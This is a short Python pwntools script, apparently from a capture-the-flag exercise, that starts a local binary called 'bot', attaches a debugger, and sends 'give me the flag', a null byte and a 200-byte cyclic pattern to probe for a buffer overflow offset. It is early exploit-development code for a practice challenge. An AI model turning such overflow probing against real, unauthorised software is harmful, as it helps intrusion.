import pwn
import sys

elf = pwn.ELF("./bot")
p=elf.process()

pwn.context.binary = elf
pwn.context.log_level = "DEBUG"
pwn.context(terminal=['tmux','split-window','-h'])

p.recvuntil(b"hi, how can i help?")
pwn.gdb.attach(p)
p.sendline(b"give me the flag\x00"+pwn.cyclic(200))

p.interactive()
